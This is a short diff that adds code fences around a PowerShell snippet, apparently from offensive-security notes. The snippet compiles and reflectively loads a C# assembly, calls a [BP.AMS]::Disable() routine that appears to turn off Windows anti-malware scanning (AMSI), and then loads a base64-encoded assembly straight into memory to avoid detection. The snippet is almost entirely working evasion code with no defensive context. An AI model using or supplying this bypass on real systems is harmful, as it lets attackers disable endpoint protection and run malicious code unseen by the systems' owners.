@@ -1,3 +1,4 @@
+```
 Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
 [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll")) #To load it into Powershell we can use its native (.NET) API:
 [BP.AMS]::Disable()
@@ -7,3 +8,4 @@ $OriginalCommand = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$pwd\\Sour
 
 #Loadoad it into memory
 [Reflection.Assembly]::Load([Convert]::FromBase64String($OriginalCommand)) | Out-Null
+```
